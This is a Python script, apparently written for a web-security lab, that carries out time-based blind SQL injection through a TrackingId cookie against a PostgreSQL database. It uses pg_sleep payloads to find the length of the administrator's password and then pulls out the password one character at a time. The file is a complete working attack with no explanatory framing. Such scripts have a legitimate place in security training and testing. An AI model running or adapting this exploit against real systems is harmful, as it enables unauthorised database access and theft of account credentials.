import requests 
import urllib3
import os 
import time 
import sys
import string 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def getPasswordLenght(url, TrackingID):
    guessedLength  = 1
    print("Getting The Password's Length")
    while True:
        try:
            print(".",end=" ", flush=True)
            payload = f"'||(case when  exists(select * from users where username='administrator' and LENGTH(password)={guessedLength})  then pg_sleep(2) else null end)--"
            cookies = {'TrackingId': f"{TrackingID } {payload}"}
            startTime = time.time()
            
            r = requests.get(url=url, verify=False, cookies=cookies, proxies=proxies)
            
            endTime = time.time()
           
            if((endTime - startTime)> 2):
                return guessedLength
            guessedLength = guessedLength +1
        except:
            print("Connection Error")
            sys.exit(-1)
def getPassword(url, TrackingID):
    gessed_password = ''
    passwordLength  = getPasswordLenght(url, TrackingID)
    print(f"\nPassword Length {passwordLength}")
    print("Cracking Passwrod: ")
    test =string.ascii_letters+ string.digits
    for length in range(1, passwordLength+1):
        for char in test:
            try:
                payload = f"'||(case when  (select SUBSTRING(password,1,{length}) from users where username='administrator')='{gessed_password+char}'  then pg_sleep(2) else null end)--"
                cookies = {'TrackingId': f"{TrackingID } {payload}"}

                startTime = time.time()
            
                r = requests.get(url=url, verify=False, cookies=cookies, proxies=proxies)
            
                endTime = time.time()
                print('\r'+gessed_password+char,end="", flush=True)
                if endTime - startTime > 2:
                    gessed_password+=(char)
                    break
            except:
                print("Connection Error")
                sys.exit(-1)
    return gessed_password

def main():
    os.system('clear')
    if(len(sys.argv)!= 3):
        print("(+) Usage: %s <url> <TrackingID> " % sys.argv[0])
        print("(+) Example: %s www.example.com PD4qQDE52qSR" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    TrackingId =sys.argv[2]
    password = getPassword(url, TrackingId)
    print('\nPassword Length is '+ str(password))
   
if __name__ == "__main__":
    main()
